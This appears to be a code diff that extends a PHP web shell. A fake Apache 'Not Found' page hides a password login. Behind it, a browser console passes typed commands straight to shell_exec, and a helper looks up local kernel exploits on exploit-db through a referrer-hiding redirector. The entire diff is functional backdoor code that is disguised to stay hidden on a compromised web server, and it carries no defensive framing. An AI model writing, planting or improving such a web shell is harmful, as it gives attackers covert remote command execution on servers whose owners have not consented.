@@ -26,8 +26,14 @@
 	 */
 	function ApacheNotFound()
 	{
-		ApacheNotFound_Head();
-		ApacheNotFound_Body();
+?>
+<head>
+	<?=ApacheNotFound_Head();?>
+</head>
+<body>
+	<?=ApacheNotFound_Body();?>
+</body>
+<?php
 		exit(0);
 	}
 
@@ -36,8 +42,7 @@
 	 */
 	function ApacheNotFound_Head()
 	{
-?>		
-<head>
+?>
 	<style>
 		div {
 			position: absolute;
@@ -53,7 +58,6 @@
 			background-color: #FFF;
 		}
 	</style>
-</head>
 <?php
 	}
 
@@ -62,8 +66,7 @@
 	 */
 	function ApacheNotFound_Body()
 	{
-?>		
-<body>
+?>
 	<h1>Not Found</h1>
 	<p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
 	<hr>
@@ -75,7 +78,6 @@
 			<input type="password" name="passwd">
 		</form>
 	</div>
-</body>
 <?php
 	}
 
@@ -86,18 +88,24 @@
 	 */
 	function Shell()
 	{
-		ShellHead();
-		ShellNavbar();
-		ShellContents();
+?>
+<head>
+	<?=ShellNavStyle();?>
+	<?=ShellContentsStyle();?>
+</head>
+<body>
+	<?=ShellContents();?>
+	<?=ShellNavbar();?>
+</body>
+<?php
 	}
 
 	/**
-	 *	Shell stylesheet template
+	 *	Shell navbar stylesheet template
 	 */
-	function ShellHead()
+	function ShellNavStyle()
 	{
 ?>
-<head>
 	<style>
 		* {
 		margin: 0;
@@ -110,8 +118,6 @@
 			height: 100vh;
 			background-color: #ddd;
 		}
-
-		/* BEGIN - NAVBAR */
 
 		div nav {
 			position: relative;
@@ -180,33 +186,124 @@
 			background: orange;
 		}
 
-		.exit a {
+		a {
 			text-decoration: none;
 		}
-
-		/* END - NAVBAR */
-		/* BEGIN - CONTENTS */
-
-		.contents {
-			position:relative;
-			width: 80%;
-			height: 80%;
-			background-color: #333;
-			margin: 50px auto;
-		}
-
-		.contents a {
-			position: relative;
-			top: 50%;
-			left: 50%;
-			transform: translate(-50%,-50%);
-			text-decoration: none;
-			color: #fff;
-		}
-
-		/* END - CONTENTS */
 	</style>
-</head>
+<?php
+	}
+
+	/**
+	 *	Shell contents stylesheet template
+	 */
+	function ShellContentsStyle()
+	{
+?>
+	<style>
+		.contents {
+			width: 100vw;
+			height: 100vh;
+			position: absolute;
+			top: 0; left: 0;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+		}
+
+		.menu {
+			width: 90%;
+			height: 80%;
+			background-color: grey;
+			display: flex;
+			flex-wrap: wrap;
+			flex-direction: row;
+			justify-content: center;
+			align-items: center;
+			align-content: center;
+		}
+
+		.submenu {
+			margin: 20px 10px;
+			background-color: #333;
+			width: calc(50% - 30px);
+			height: calc(100% - 40px);
+			display: flex;
+			flex-wrap: wrap;
+			flex-direction: row;
+			justify-content: center;
+			align-items: center;
+			align-content: center;
+		}
+		
+		.full-element
+		{
+			width:97%;
+		}
+
+		/* BEGIN - CONSOLE */
+
+		.title {
+			color: #333;
+			height: 30px;
+			font-weight: bold;
+			text-align: center;
+			vertical-align: middle;
+			line-height: 30px;
+			font-size: 18px;
+			background: tomato;
+			letter-spacing: 0px;
+			text-transform: uppercase;
+			margin-bottom: 5px;
+			border: 1px solid grey;
+		}
+
+		.console-output {
+			height: calc(100% - 90px);
+			resize: none;
+			background-color: #333;
+			color: white;
+			border: 1px solid grey;
+			padding: 10px;
+			scrollbar-width: none;		// Firefox
+			-ms-overflow-style: none;	// IE 10+
+
+			::-webkit-scrollbar {
+				display: none;
+			}
+		}
+
+		.console-input {
+			width: 100%;
+			height: 30px;
+			background-color: #333;
+			color: white;
+			padding: 0 10px;
+			border: 1px solid grey;
+			border-top: 0;
+		}
+
+		/* END - CONSOLE */
+
+		.button {
+			width: 25%;
+			color: #333;
+			height: 30px;
+			font-weight: bold;
+			text-align: center;
+			vertical-align: middle;
+			line-height: 30px;
+			font-size: 14px;
+			background-color: grey;
+			text-transform: uppercase;
+			margin-bottom: 5px;
+			border: 1px solid #333;
+		}
+
+		.button:hover {
+			background: tomato;
+		}
+
+	</style>
 <?php
 	}
 
@@ -237,8 +334,32 @@
 	{
 ?>
 <div class="contents">
-	<a href="?phpinfo"><span>TEST</span></a>
+	<div class="menu">
+		<div class="submenu">
+			<div class="title full-element">🎮   CONSOLE   🎮</div>
+			<textarea readonly id="console" class="console-output full-element">
+<?php
+		foreach($_SESSION['OUTPUTS'] as $output)
+		{
+			echo $output . PHP_EOL;
+		}
+?>
+			</textarea>
+			<form class="full-element" method="POST">
+				<input type="text" name="cmd" class="console-input">
+			</form>
+		</div>
+		<div class="submenu">
+			<a class="button" href="?info">PHPINFO</a>
+			<a class="button" href="<?=ExploitDB();?>">EXPLOIT-DB</a>
+		</div>
+	</div>
 </div>
+
+<script>
+	var textarea = document.getElementById('console');
+	textarea.scrollTop = textarea.scrollHeight;
+</script>
 <?php
 	}
 
@@ -300,6 +421,7 @@
 		global $passphrase;
 		if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase)))
 		{
+			$_SESSION['OUTPUTS'] = array();
 			$_SESSION[md5($_SERVER['REMOTE_ADDR'])] = true;
 			ReloadPage();
 		}
@@ -314,9 +436,32 @@
 	 */
 	function ClearSession()
 	{
+		unset($_SESSION['OUTPUTS']);
 		unset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]);
 		session_destroy();
 		ReloadPage();
+	}
+
+	function RunCommand()
+	{
+		$format_cmd = strtolower(trim($_POST['cmd']));
+		if((strcmp($format_cmd,"cls") == 0) || (strcmp($format_cmd,"clear") == 0))
+		{
+			$_SESSION['OUTPUTS'] = array();
+		}
+		else
+		{
+			$output = "$ " . $_POST['cmd'] . PHP_EOL . shell_exec($_POST['cmd'] . ' 2>&1');
+			array_push($_SESSION['OUTPUTS'], $output);
+		}
+	}
+
+	function ExploitDB()
+	{
+		$kernel = explode(" ", $GLOBALS['INFO']['KERNEL'])[0];
+		$release = explode(".", $GLOBALS['INFO']['RELEASE'])[0];
+		$exploitdb = "http://nullrefer.com/?https://www.exploit-db.com/search?q=";
+		return $exploitdb . $kernel . "+" . $release;
 	}
 
 	// ---- ENTRYPOINT ----
@@ -334,13 +479,14 @@
 		}
 		else if(isset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]))
 		{
-			if(isset($_GET['phpinfo']))
+			if(isset($_POST['cmd']))
+			{
+				RunCommand();
+			}
+
+			if(isset($_GET['info']))
 			{
 				phpinfo();
-			}
-			else if(isset($_GET['cmd']))
-			{
-				echo shell_exec($_GET['cmd'] . ' 2>&1');
 			}
 			else
 			{		
@@ -356,4 +502,5 @@
 	Main();
 
 	// https://github.com/mIcHyAmRaNe/wso-webshell
+	// https://coolors.co/dddddd-aaaaaa-808080-333333-ff6347
 ?>
